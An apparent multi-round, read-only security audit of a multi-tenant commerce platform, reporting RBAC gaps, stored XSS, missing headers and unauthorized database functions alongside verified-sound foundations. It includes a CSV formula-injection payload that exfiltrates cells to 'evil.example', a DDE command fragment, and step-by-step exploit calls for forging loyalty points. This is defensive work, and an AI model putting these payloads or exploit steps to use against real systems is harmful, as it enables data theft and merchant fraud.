Read-only. No code, no migration, no DML.

This round audited the things everything else rests on, rather than more features. **Most of them are sound** — and the
two that are not explain why other findings exist.

---

## R8-1 · There are two disjoint role vocabularies, and neither is authoritative — P1

This is the structural cause of SEC-03 (RBAC unenforced) and it undermines the fix I proposed for SEC-04.

**Vocabulary A — `tenant_members.role`.** Live values, all 23 rows:

| role | status | count |
|---|---|---|
| `admin` | active | **19** |
| `member` | active | 4 |

**Vocabulary B — `user_profiles.role`**, which is what `lib/permissions.ts` models:
`super_admin | admin | employee | viewer`, with 14 named permissions.

They never reconcile. Server-side gates pick one arbitrarily:

- `is_tenant_admin(p_tenant_id)` checks `tenant_members.role = 'admin'`
- `orders/delete` checks `user_profiles.role === 'viewer'`
- `payroll-pdfs` storage policy checks `user_profiles.role = 'admin'`
- `apps/admin` middleware checks a **third** table, `admin_users.admin_role`

Three consequences:

1. **`requireTenantAdmin()` admits 19 of 23 users (83%).** My SEC-04 fix recommendation — route the 11 unscoped routes
   through it — closes the *cross-tenant* hole but provides almost no *privilege* separation. Both are needed; do not
   read the first as delivering the second.
2. **`is_tenant_admin` excludes `super_admin`.** It matches `role = 'admin'` only, which is precisely what
   `lib/permissions.ts` warns against in a comment: *"Use this rather than checking `role === "admin"` directly so
   super_admin users aren't accidentally locked out."* The database does the thing the app code warns about. Harmless
   today only because `tenant_members.role` never contains `super_admin`.
3. **The app's 14 permissions have no DB representation at all**, which is why SEC-03 cannot be fixed by "adding a check"
   — there is nothing to check against. `role_permissions` and `user_permissions` exist (22 and 0 rows) but are read by
   nothing server-side.

**Fix (design, before code).** Pick one axis. `tenant_members` is the right one — it is per-tenant, which
`user_profiles.role` structurally cannot be. Widen its role vocabulary to the four app roles, express the permission
matrix in `role_permissions`, and make RLS and `requirePermission()` both read from it.

Also: `is_tenant_admin` and `get_current_tenant_id` have **no `SET search_path`** — they are two of SEC-18's 26, and they
are security-decision functions, so they should be fixed first within that group.

---

## R8-2 · Order numbers are globally unique, not per-tenant — P1

```sql
CREATE UNIQUE INDEX orders_order_id_key ON public.orders USING btree (order_id);
```

`order_id` is the human-facing order number, generated **per tenant** by prefix scan inside `create_order_atomic`. The
uniqueness constraint is **global**.

Consequences:

1. **One shared numbering namespace across all 28 tenants.** If tenant A holds `LF-00001`, tenant B can never have it —
   so B's generation attempt fails with `23505` and the merchant sees "order creation failed" caused by a *different
   merchant's* data.
2. This is structurally the same shape as the incident already in the record where "every web checkout collided on …001".
   The `created_at` filter bug was fixed; **the global constraint that turns any generation collision into a hard failure
   was not.**
3. Minor information leak: gaps in a tenant's sequence reveal other tenants' volume.

**Current state: 0 duplicate `(tenant_id, order_id)` pairs** — because the index prevents them by failing the insert. The
symptom is refused orders, not duplicates.

**The correct pattern is already in the same table.** `uq_orders_tenant_idempotency` is
`UNIQUE (tenant_id, idempotency_key) WHERE idempotency_key IS NOT NULL` — properly tenant-scoped and partial. The order
number index just never got the same treatment.

**Fix.** Drop `orders_order_id_key`, add `UNIQUE (tenant_id, order_id)`. Check for cross-tenant number reuse before
migrating.

---

## R8-3 · No security headers on any app — P1

`apps/platform/next.config.ts:110` has a `headers()` block, and it sets **only `Cache-Control`** for fonts, images and
static assets. `apps/storefront` has **no `headers()` at all**, and neither does `apps/admin`.

Absent everywhere:

| Header | Why it matters here |
|---|---|
| `Content-Security-Policy` | `tenant-assets` is a **public bucket that allows `image/svg+xml`** (SEC-06 sibling). A stored SVG served from your own origin executes script with nothing to contain it. CSP is the containment that is missing. |
| `X-Content-Type-Options: nosniff` | MIME confusion on merchant-uploaded files in public buckets. |
| `Strict-Transport-Security` | No HSTS on storefronts served over custom domains. |
| `X-Frame-Options` / `frame-ancestors` | Clickjacking. Needs care — the store builder legitimately iframes `/_preview`, so this must be an allowlist, not `DENY`. |
| `Referrer-Policy` | Order-tracking URLs contain phone and order number; full referrers leak them to third parties. |
| `Permissions-Policy` | Unused-capability reduction. |

The storefront is the higher priority: it takes checkout input, serves merchant-uploaded content, and runs on customer
devices.

---

## R8-4 · The unauthenticated `settings/auto-send` route is the master switch for all outbound WhatsApp — P0

Logged in Round 2 as one of three unauthenticated service-role routes. Tracing what it actually controls upgrades it.

`app/api/settings/auto-send/route.ts` — `GET` and `PUT`, service role, **no auth of any kind** — reads and writes
`app_settings` under key `whatsapp_auto_send`. And `app_settings` has **no `tenant_id`**: it is global.

What reads that key:

- `lib/whatsapp-dispatcher.ts:67–76` gates **every outbound WhatsApp message** on `enabled`, logging
  `"Skipping order … because whatsapp_auto_send is disabled."`
- `app/api/cron/auto-follow-up/route.ts:124` reads `default_discount_percent` as the discount **offered in automated
  follow-up messages**.

So an unauthenticated `PUT` from anywhere on the internet can:

1. **Silently disable all customer WhatsApp platform-wide.** Given this project's history of WhatsApp failing quietly for
   weeks, that is close to undiagnosable — and with OPS-01 (Sentry dead) nothing would report it.
2. **Set the discount advertised in automated messages to any value.** `default_discount_percent` is taken as
   `body.default_discount_percent ?? 10` with no bound — the same missing-clamp class as MONEY-05.

**Fix.** `resolveCallerTenant()` + `requireTenantAdmin()`, Zod with a bounded discount, and move the key to a
tenant-scoped table — a global toggle is wrong for a multi-tenant product regardless of who can write it.

---

## Foundations verified sound

These were the highest-leverage things to check, and they hold up.

### `get_user_tenant_ids()` — the linchpin of every RLS policy — is correct

```sql
CREATE OR REPLACE FUNCTION public.get_user_tenant_ids()
 RETURNS SETOF uuid LANGUAGE sql STABLE SECURITY DEFINER SET search_path TO 'public'
AS $$
  SELECT tm.tenant_id FROM tenant_members tm
  JOIN user_profiles up ON up.id = tm.user_id
  WHERE tm.user_id = auth.uid() AND tm.status = 'active' AND coalesce(up.is_active, true);
$$
```

Membership-derived (not a forgeable JWT claim — the 2026-05 B-03 fix held), checks `tm.status = 'active'` **and**
`up.is_active`, `STABLE`, and `SET search_path`. Every `tenant_id IN (SELECT get_user_tenant_ids())` policy in the schema
rests on this and it is right.

### Realtime exposure is minimal and gated

`supabase_realtime` publishes only four tables: `notifications`, `orders`, `qc_quarantine`, `qc_quarantine_events`. Chat
deliberately uses broadcast-from-DB instead of table replication, so its message traffic is not in the publication.

`realtime.messages` (the partitioned parent) has `relrowsecurity = true` with five chat policies —
`chat_realtime_conv_read/write`, `chat_realtime_inbox_read`, `chat_realtime_presence_read/write`. *(An earlier query of
mine looked only at the child partitions and appeared to show RLS off; partitions inherit from the parent. RLS is on.)*

`notifications` RLS is correctly scoped and audience-aware:
`tenant_id IN get_user_tenant_ids() AND (audience = 'tenant' OR recipient_id = auth.uid())`.

### No SQL-injection surface in the database

Zero functions in `public` contain dynamic SQL (`EXECUTE format(...)`, `EXECUTE '…' || …`). Across ~200 functions, that is
a genuinely clean result.

### CAPI tokens are deliberately kept out of the browser — and I was wrong to suspect otherwise

I chased this hard because the setup looked dangerous: `renderCtx={{ tenant, products, categories }}` hands the tenant
object to `RenderPage`, five sections are `"use client"` and read `ctx.tenant.store_config_v2?.commerce`, and
`AnalyticsConfig` co-mingles public pixel IDs with secret `meta_capi_token` / `tiktok_capi_token` in one object. Any prop
crossing the server→client boundary is serialized into the flight payload, so that path would have put CAPI tokens in
page source.

It does not, because `apps/storefront/lib/tenant.ts:82` exists:

```ts
function redactTenant(tenant: Tenant | null): Tenant | null {
  …
  store_config_v2:       redactServerOnlyConfig(t.store_config_v2 …),
  store_config_v2_draft: redactServerOnlyConfig(t.store_config_v2_draft …),
}
```

applied on **every** return path of `selectTenant`, including the legacy-schema fallback, with the reasoning written
down: *"the storefront serializes the full config into the section tree, so this is the single chokepoint that keeps
tokens out of the browser. The checkout server action fetches the tenant separately and therefore still sees the tokens
for CAPI."* Someone anticipated exactly this attack and closed it at the one place that covers all callers.

Residual, P2 only: the design depends on one chokepoint and on nobody adding a second tenant-fetch path. Splitting
`AnalyticsConfig` into public and server-only halves at the type level would make the mistake impossible rather than
merely avoided. **My earlier grep for a stripping helper missed this because it is named `redactTenant`.**

### Also clean

- **Preview tokens** — HMAC-SHA256, `timingSafeEqual` comparison, TTL enforced server-side, throws if the secret is
  missing (no weak fallback), unit-tested, and verified in the `/_preview` route.
- **PII hashing for CAPI** — phone, email and name are SHA-256 hashed in `capi.ts` before leaving the server.
- **Service worker** — `NetworkOnly` for both `*.supabase.co` and `/api/`, with the intent stated in a comment
  ("must always go to the network"). No authenticated response is cacheable, so no cross-user leak on shared devices —
  which matters for Iraqi back-office PCs.
- **CORS** — no `Access-Control-Allow-Origin` anywhere. Nothing permissive to exploit.
- **`verifyAccessToken`** — validates via `supabase.auth.getUser()` against the auth server rather than decoding the JWT
  locally. Correct. (It does `console.log` a token prefix and the user id on every call — harmless in itself, since a
  JWT's first 10 characters are a constant header, but it adds to OPS-04.)
- **`uq_orders_tenant_idempotency`** — correctly tenant-scoped and partial. The pattern R8-2 needs.

---

## What this round changes about the overall picture

Seven rounds found defects in features. This round checked the foundations and found them **largely correct**: the RLS
linchpin, realtime scoping, token verification, preview signing, secret redaction, injection surface and service-worker
caching are all sound.

That sharpens the diagnosis. The problem is not a weak foundation. It is that **the foundation is not consistently
reached for** — the same repo that wrote `redactTenant` to protect one secret left `vault_backups` open to every signed-up
user, and the same repo that scoped `uq_orders_tenant_idempotency` per tenant left the order-number index global.

R8-1 is the exception and the most important finding of the round: it is a genuine foundational gap. Authorization has no
single source of truth, which is why every gate in the codebase picks a different table and why SEC-03 cannot be fixed
without a design decision first.

---

# Round 9 — triggers, cache keying, export safety, XSS sinks, delivery money

Read-only. No code, no migration, no DML.

One new P0 with a fully public trigger. Also the round that most strongly confirms the audit's central pattern: the
vulnerability below **was found, documented and fixed once** — in one file out of five.

---

## R9-1 · Stored XSS on the storefront, publicly triggerable on any tenant — P0

**The sink.** Four legacy templates inject merchant-authored HTML with no sanitizer:

```
apps/storefront/templates/general/Home.tsx:85      dangerouslySetInnerHTML={{ __html: about.body || "" }}
apps/storefront/templates/schneiders/Home.tsx:317   dangerouslySetInnerHTML={{ __html: about.body || "" }}
apps/storefront/templates/fashion/Home.tsx:88       dangerouslySetInnerHTML={{ __html: about.body || "" }}
apps/storefront/templates/electronics/Home.tsx:69   dangerouslySetInnerHTML={{ __html: about.body || "" }}
```

**The same bug was already fixed elsewhere.** `app/s/[tenant]/about/page.tsx:63` carries the fix and the reasoning:

```ts
// EC4: `about.body` is merchant-authored config rendered on a public page.
// It was injected via dangerouslySetInnerHTML → stored XSS (arbitrary JS on
// the storefront/checkout origin). With no HTML sanitizer dependency, render
// it as plain text instead: strip tags to paragraphs and let React escape it.
const aboutParagraphs = htmlToSafeParagraphs(tenant.store_config?.about?.body);
```

EC4 was diagnosed correctly, fixed correctly, and **not backported to the four sibling Home templates.**

**The trigger is public and needs no login.** `app/s/[tenant]/page.tsx:61`:

```ts
const { preview_template } = await searchParams;
…
const preview = preview_template && TEMPLATE_NAMES.has(preview_template as TemplateName)
  ? (preview_template as TemplateName) : undefined;
…
if (!preview && v2) { /* render V2 */ }      // ← `preview` set ⇒ fall through to the legacy template
```

So the legacy path is reached **either** when a tenant has no `store_config_v2` (un-ported tenants) **or** when any
visitor appends `?preview_template=<name>` to any tenant's public storefront URL. `searchParams` is unauthenticated.

**Full chain.** Payload is stored in `store_config.about.body` — writable by any tenant member, since per SEC-03/SEC-30
there is no server-side role enforcement. A visitor then loads
`https://<store>/s/<tenant>?preview_template=schneiders` and arbitrary JS executes **on the storefront/checkout origin**.
With SEC-31 (no CSP anywhere) nothing contains it. On the checkout origin that means form skimming of customer name,
phone, address and COD details, plus session theft.

**Fix.** Apply `htmlToSafeParagraphs` (already written, already tested) in all four templates. Then gate
`preview_template` behind the existing signed preview-token mechanism — `packages/shared/src/preview-token.ts` already
does HMAC + TTL properly and is exactly what this parameter should have used.

---

## R9-2 · No CSV formula-injection guard in any of eight exporters — P1

Eight CSV/XLSX exporters: `order-export-utils`, `finance-hub-export`, `payroll-csv-export`, `reports-export`,
`finance-export`, `customer-data-export`, `export-utils`, `customer-export`. **None** prefixes cells that begin with
`=`, `+`, `-`, `@`, tab or CR.

Those exports carry fields that untrusted parties control: `customer_name`, `notes`, `address_details` — all accepted
verbatim from the storefront checkout form and from WhatsApp.

**The path is complete.** A customer orders under the name:

```
=HYPERLINK("https://evil.example/?d="&A1&A2&A3,"Click to view order")
```

The merchant exports their orders and opens the file in Excel or LibreOffice, which evaluates the formula. Depending on
the client and its macro settings this ranges from silent data exfiltration of the surrounding cells to command execution
(`=cmd|' /C …'!A0` on legacy Excel/DDE). **Untrusted storefront input → code running on the merchant's own machine.**

**Fix.** One shared `csvCell()` helper that both escapes quotes and prefixes dangerous leading characters with `'`, used
by all eight exporters. This also fixes R9-3.

---

## R9-3 · Half the exporters don't escape embedded quotes — P2

`apps/platform/lib/customer-export.ts:39`:

```ts
const csvContent = rows.map((row) => row.map((cell) => `"${cell}"`).join(",")).join("\n");
```

Cells are wrapped in quotes but embedded `"` is **not doubled**, so any value containing a quote breaks the CSV
structure and misaligns every subsequent column in that row.

Escaping coverage across the eight exporters is uneven: `export-utils` handles it, `finance-hub-export` and
`payroll-csv-export` partially, and **`order-export-utils`, `reports-export`, `finance-export` and `customer-export`
not at all**. Arabic customer notes containing quotes are common.

---

## R9-4 · Three triggers on the hottest table lack `SET search_path` — P2

Of the 12 triggers on `orders`, these three functions have no pinned search path:
`increment_order_version`, `set_order_completed_at`, `trigger_update_trust_on_order`.

They are a subset of SEC-18's 26, called out separately because they run on **every single order write** — the highest
frequency execution path in the product. `trigger_update_trust_on_order` also makes no reference to `tenant_id` while
writing `customer_trust`.

---

## R9-5 · One cache tag for all tenants — P2

`apps/storefront/lib/queries.ts:26`:

```ts
{ revalidate: STOREFRONT_CACHE_SECONDS, tags: ["storefront-catalog"] }
```

A single shared tag for every tenant's catalog. The comments say on-demand revalidation via a platform→storefront publish
webhook is planned — when that lands, **one merchant publishing will invalidate all 28 tenants' catalogs at once**, and
every one of them then re-reads the database. A thundering herd triggered by an unrelated tenant's action.

`getTenantBySlug` already does this correctly: `tags: ["storefront-tenant", \`storefront-tenant-${slug}\`]`. The catalog
cache needs the same per-tenant tag.

*(Minor, same file: `getTenantByCustomDomain`'s docstring says "Stub for now — will query a `tenant_domains` table later"
while the body already queries `tenant_domains`. Stale comment on a feature that OPS-08 shows is half-finished.)*

---

## Verified sound this round — and several are exemplary

### The trigger stack on `orders` is in good order

12 triggers: 4 `BEFORE ROW`, 7 `AFTER ROW`, 1 `AFTER STATEMENT`.

- **No trigger writes back to `orders`** — checked all 11 functions. No recursion risk, which is the classic failure mode
  for a stack this deep.
- **All the heavier ones set `tenant_id` and pin `search_path`**: `chat_orders_event`, `inv_order_changed`,
  `log_order_creation_history`, `log_order_update_notifications`, `loyalty_order_changed`, `referral_order_changed`,
  `log_inventory_notifications`, and `log_order_notification` — which resolves the concern on record that re-adding that
  trigger verbatim would have produced rows RLS hides. It sets `tenant_id`.
- **Both statement-level triggers use proper transition tables**:
  `AFTER UPDATE … REFERENCING OLD TABLE AS old_rows NEW TABLE AS new_rows FOR EACH STATEMENT`. The
  `CREATE TEMP TABLE`-in-a-statement-trigger incident is genuinely fixed, not worked around.

### `enforce_order_created_at_not_future` is timezone-correct

```sql
IF NEW.created_at IS NOT NULL AND NEW.created_at > now() + interval '5 minutes' THEN RAISE …
```

`created_at` is `timestamptz`, so both sides are absolute instants — a Baghdad wall-clock value is not misread as
future-dated. Five minutes of clock-skew tolerance, `SET search_path TO ''`, and an error message that names the correct
alternative (`scheduled_date`). Notable given MONEY-12: this is the one date-handling site that gets timezones right,
because it never converts to a calendar day.

### Storefront caching is correctly tenant-keyed

Every catalog cache key includes the tenant: `["listProducts", tenantId, …]`, `["getProductBySlug", tenantId, …]`,
`["listCategories", tenantId]`, `["getCategoryBySlug", tenantId, slug]`, `["listProductsInCategory", tenantId, categoryId, …]`;
the two product-scoped ones key on a globally unique `productId`. `getTenantBySlug` keys on slug.
**No cross-tenant cache bleed** — the most likely place for one, and it is closed.

### `computeDeliveryFee` is a model of how to fix a money bug

`packages/shared/src/delivery.ts` — single source of truth, with the incident that motivated it recorded in the header:
three sections had drifted thresholds (75k vs 50k) so one screen showed free delivery and another a 5k fee, "and the
server recorded `delivery_fee=0` regardless, so the courier collected an amount the order never recorded (a COD
reconciliation gap)."

The implementation guards non-finite and non-positive inputs, resolves a per-governorate rate with its own free
threshold, falls back to the documented flat model, and rounds once. **Shown == recorded == collected.** This is the
standard the payroll and commission math (MONEY-07..10, MONEY-15) should be held to.

### Also clean

- **`sanitizeCustomCss(rawCustomCss)`** is applied to merchant-authored CSS at `layout.tsx:235` — the CSS sink was
  considered even though the HTML sink next to it was missed in four files.
- **`htmlToSafeParagraphs`** exists, works, and is unit-testable — R9-1's fix is already written, just not called.

---

## The pattern, now with nine rounds of evidence

| Correct implementation in the repo | Sibling that never received it |
|---|---|
| `htmlToSafeParagraphs` in the V2 about page (EC4) | 4 legacy `Home.tsx` templates — **R9-1, P0** |
| `sanitizeCustomCss` for merchant CSS | the `about.body` HTML sink beside it |
| `redactTenant` chokepoint for CAPI secrets | `vault_backups` open to every signed-up user (SEC-01) |
| `uq_orders_tenant_idempotency` scoped per tenant | `orders_order_id_key` global (DATA-10) |
| `chat-attachments` tenant+membership storage ACL | `product-images` DELETE to `anon` (SEC-02) |
| `chat_search_messages` `REVOKE … FROM PUBLIC` | 69 open definer functions (SEC-11) |
| `requireCronAuth` fails closed | Telegram webhook fails open (SEC-27) |
| `unfurl`'s six-layer SSRF defence | `generate-batch-pdf` renders arbitrary HTML (SEC-25) |
| `computeDeliveryFee` single source of truth | payroll and commission math (MONEY-07..15) |
| Per-slug cache tags on `getTenantBySlug` | one shared catalog tag (R9-5) |
| Statement triggers with transition tables | — *(this one was backported properly)* |

Eleven pairs. In ten of them the fix exists in the codebase and was not carried across. **The remediation work is
overwhelmingly mechanical: find the file that got it right, apply the same thing next door.** That is a far better
position than needing to invent the answers, and it is why the P0 count should not be read as a verdict on the
engineering.

---

# Round 10 (final) — the transactional core: resolving SEC-11 from assumption to fact

Read-only. No code, no migration, no DML.

Nine rounds established **who can call** the `SECURITY DEFINER` functions. SEC-11 recorded that 69 are executable by
`authenticated` and that the 15 touching money or stock "need re-verification" — an open assumption, which is not good
enough to hand to a fix campaign. This round reads them.

The result is the **cleanest end-to-end monetary exploit in the audit**, and a correction that clears the team of
something I had suspected.

---

## R10-1 · `adjust_customer_points` has no authorization, and loyalty points are money — P0

**Full body. There is nothing omitted:**

```sql
CREATE OR REPLACE FUNCTION public.adjust_customer_points(
    _tenant_id uuid, _phone text, _delta integer, _reason text, _order_id uuid DEFAULT NULL)
 RETURNS integer LANGUAGE plpgsql SECURITY DEFINER SET search_path TO 'public'
AS $function$
DECLARE _new integer;
BEGIN
    INSERT INTO public.customer_points (tenant_id, phone, balance, updated_at)
        VALUES (_tenant_id, _phone, _delta, now())
    ON CONFLICT (tenant_id, phone) DO UPDATE
        SET balance = public.customer_points.balance + _delta, updated_at = now()
    RETURNING balance INTO _new;

    IF _new < 0 THEN RAISE EXCEPTION 'insufficient_points'; END IF;

    INSERT INTO public.customer_points_ledger (tenant_id, phone, delta, reason, order_id)
        VALUES (_tenant_id, _phone, _delta, _reason, _order_id);
    RETURN _new;
END; $function$
```

No membership check. No `auth.uid()`. No `auth.role()`. No `is_tenant_admin`. `_tenant_id`, `_phone` and a **signed**
`_delta` all come from the caller, and `has_function_privilege('authenticated', …, 'EXECUTE')` is **true**.

The only guard is `IF _new < 0` — which stops the balance going *negative*. Nothing stops it going arbitrarily *positive*.

**The exploit is complete and monetary.** Points convert to an IQD discount at checkout via `resolveRedemption`
(`redeemValueIqd`), which Round 4 verified as mathematically correct — and correctness is the problem here, because it
faithfully converts forged points into a real discount:

1. Sign up at the public, unverified, unrate-limited `/api/auth/signup` (SEC-15).
2. `rpc('adjust_customer_points', { _tenant_id: '<victim tenant>', _phone: '<your phone>', _delta: 100000000, _reason: 'x' })`
3. Shop on that merchant's storefront and redeem at checkout.

The discount is capped per order only by `maxRedeemPct` of the subtotal — and the balance is unbounded, so it repeats
across unlimited orders. In a COD market the merchant ships goods and collects the discounted amount; the loss is real
inventory and real margin.

This is on record as having been *found* to lack an auth check. **It still lacks one.** The grant was never narrowed and
no check was added.

---

## R10-2 · `inv_apply` lets any authenticated user rewrite any tenant's stock — P0

`inv_apply(p_order_id uuid, p_items jsonb, p_status text, p_sign integer, p_tenant_id uuid)` — `SECURITY DEFINER`,
executable by `authenticated`, **no caller check of any kind**.

The body is defensive about *shape* and indifferent to *authority*: it validates that `p_items` is an array, regex-checks
each UUID, rounds quantities, skips zero-quantity lines — and then applies the movement for whatever `p_tenant_id` it was
handed, with whatever `p_sign` it was handed.

So a caller chooses the tenant, the products, the quantities and the direction, and the function writes `stock_quantity`,
`reserved_quantity`, `open_box_quantity` and `inventory_ledger` rows accordingly. Combined with DATA-02 (eight code paths
already write stock directly, so drift is normal and unremarkable) the manipulation would not look anomalous.

---

## R10-3 · Four more unauthorized money/stock functions — P1

Same audit, same result — `SECURITY DEFINER`, `authenticated=X`, no caller authorization:

| Function | What a caller of any tenant can do |
|---|---|
| `recompute_inventory(p_tenant_id)` | Force a full inventory recompute for another tenant — cheap DoS on a hot table, and it overwrites drift that may be real data. |
| `zero_oversold(p_tenant_id)` | Zero out another tenant's oversold positions, destroying the signal that they were oversold. Also on record as previously found unchecked. |
| `increment_usage_tracking(_tenant_id, _year, _month)` | Inflate any tenant's usage counters → trip `plan_limits`, trigger the downgrade warnings in `changePlanAction`, and drive overage billing. |
| `increment_order_usage(p_tenant_id)` | Same, and it is additionally one of the functions with **no `SET search_path`**. |

`increment_usage_tracking` deserves emphasis: it is the metering input for billing. An attacker inflating a competitor's
usage is billing fraud against a third party, executed through your platform.

---

## R10-4 · `process_return` and `undo_return` are authorized but unlocked — P1

Both check the caller correctly. Neither takes a row lock.

Every other inverse operation in the family does: `merge_orders_atomic`, `unmerge_orders_atomic`,
`split_order_atomic/4` and `unsplit_order_atomic` all use `FOR UPDATE`. The return pair is the exception.

Two concurrent `process_return` calls on one order can therefore both pass their guards and both apply — restocking
inventory twice and writing two refund transitions. A double-tap on a slow connection is the realistic trigger, not an
attacker.

---

## Correction — the legacy overloads are NOT a bypass, and I had assumed they were

I expected classic overload shadowing: a fix applied to a new signature while the old one stayed callable. The function
list looked exactly like that — `create_order_atomic(jsonb)` and `split_order_atomic(uuid, jsonb, jsonb)` both showed no
caller check while their wider siblings had one, and both are granted to `authenticated`.

**Reading them shows the opposite.** Both are deliberate deprecation shims:

```sql
CREATE OR REPLACE FUNCTION public.create_order_atomic(_order_data jsonb) …
BEGIN
    IF coalesce(auth.role(), 'service_role') <> 'service_role' THEN
        RAISE EXCEPTION 'create_order_atomic(jsonb) is deprecated - call create_order_atomic(jsonb, uuid) with an explicit tenant_id'
            USING ERRCODE = '42501';
    END IF;
    RETURN public.create_order_atomic(_order_data, NULL::uuid);
END;
```

`split_order_atomic/3` is identical in shape. An `authenticated` caller gets `42501` with a message naming the correct
signature. That is a well-managed deprecation, and it is why my automated "has a caller check" heuristic mis-scored them:
they enforce via `auth.role()` rather than a membership lookup.

**Stating this plainly because the opposite claim would have been a serious and unfair finding.** It also validates the
approach the six unchecked functions need: these two show the team already knows how to shut a definer function against
`authenticated` callers.

One small note on the pattern itself: `coalesce(auth.role(), 'service_role')` treats a NULL role as service-role, i.e.
fails **open** on NULL. Via PostgREST `auth.role()` is always populated, so this is not exploitable there — but it is the
same fail-open shape as SEC-27, and `coalesce(auth.role(), '')` would cost nothing.

---

## Verified sound — the correct pattern, fully formed, nine times

Nine of the seventeen functions audited carry the complete triad: **caller authorization + `FOR UPDATE` row lock +
`auth.role()` service-role handling.**

| Function | Caller check | Row lock | Role check |
|---|---|---|---|
| `charge_wallet_atomic` | ✅ | ✅ | ✅ |
| `merge_orders_atomic` | ✅ | ✅ | ✅ |
| `unmerge_orders_atomic` | ✅ | ✅ | ✅ |
| `split_order_atomic/4` | ✅ | ✅ | ✅ |
| `unsplit_order_atomic` | ✅ | ✅ | ✅ |
| `create_order_atomic/2` | ✅ | — | ✅ |
| `process_return` | ✅ | ❌ R10-4 | ✅ |
| `undo_return` | ✅ | ❌ R10-4 | ✅ |
| `log_shipping_export` | ✅ | — | ✅ |

`charge_wallet_atomic` is the reference implementation — it is the function the 2026-05 audit called a wallet-drain P0,
and it now has all three protections. **That fix was done properly and it held.** Every function in R10-1..R10-3 needs
exactly what `charge_wallet_atomic` already has.

**And `anon` can execute none of the seventeen.** `has_function_privilege('anon', …)` is `false` across the board. The
2026-05 finding that 26 definer functions were granted to `anon` is **fully closed** — including the `REVOKE … FROM
PUBLIC` subtlety that a plain `REVOKE … FROM anon` would have silently missed.

---

## SEC-11 resolved

The open assumption is now a fact. Of the seventeen money/stock `SECURITY DEFINER` functions:

- **6 have no caller authorization** — `adjust_customer_points`, `inv_apply`, `recompute_inventory`, `zero_oversold`,
  `increment_usage_tracking`, `increment_order_usage`. Two of these (R10-1, R10-2) are P0.
- **2 are correctly deprecated shims** — not a bypass. My prior suspicion was wrong.
- **9 are correct**, and 2 of those 9 are missing only a row lock.
- **0 are reachable by `anon`.**

SEC-11 should be rewritten from "69 functions need review" to this precise list, plus a standing rule: **default-revoke
`EXECUTE` from `PUBLIC` and `authenticated` on every new definer function**, granting back only where a caller path needs
it. `chat_search_messages` (Round 7) is the migration idiom; `charge_wallet_atomic` is the function-body idiom.

---

## Closing assessment after ten rounds

**101 findings, 17 P0, 35 areas verified clean.** The number to hold onto is not 101 — it is that **in eleven of twelve
cases where something is wrong, the correct version already exists in the same repository.**

`charge_wallet_atomic` shows how to secure a definer function; six functions never got it. `chat-attachments` shows how to
scope a storage ACL; `vault_backups` never got it. `htmlToSafeParagraphs` shows how to render merchant HTML;
four templates never got it. `computeDeliveryFee` shows how to make one number authoritative; payroll and commission
never got it. `uq_orders_tenant_idempotency` shows how to scope a unique index; the order-number index never got it.
`requireCronAuth` shows how to fail closed; the Telegram webhook never got it. `unfurl` shows how to defend an outbound
fetch; `generate-batch-pdf` never got it.

This is not a codebase that lacks the knowledge. It is a codebase where **fixes were applied at the site of the incident
rather than to the class of defect**, and where the three mechanisms that would have caught the omissions — tests in CI,
working error reporting, and a dependency gate — were all switched off simultaneously.

So the remediation plan is mostly not engineering judgement. It is: **for each finding, find the sibling that got it
right, apply the same thing, then add the gate that stops it drifting again.** The gates matter more than any individual
fix, and there are only six of them.

Two findings are exceptions that need design work before code, and they should be scheduled first because everything
else depends on them:

- **SEC-30** — authorization has no single source of truth. Three role vocabularies across three tables, and the app's 14
  permissions have no database representation at all. SEC-03 cannot be fixed without choosing one.
- **DATA-05** — 79% of the production database is demo data, so no dashboard figure, benchmark or capacity estimate
  currently means anything. Nothing measurable improves until the seed tenants move out.

Audit closed at ten rounds. **Nothing has been fixed.** Every ID in the ledger remains `OPEN`, and each fix round needs
the approval sentence, scoped to the IDs named in it.
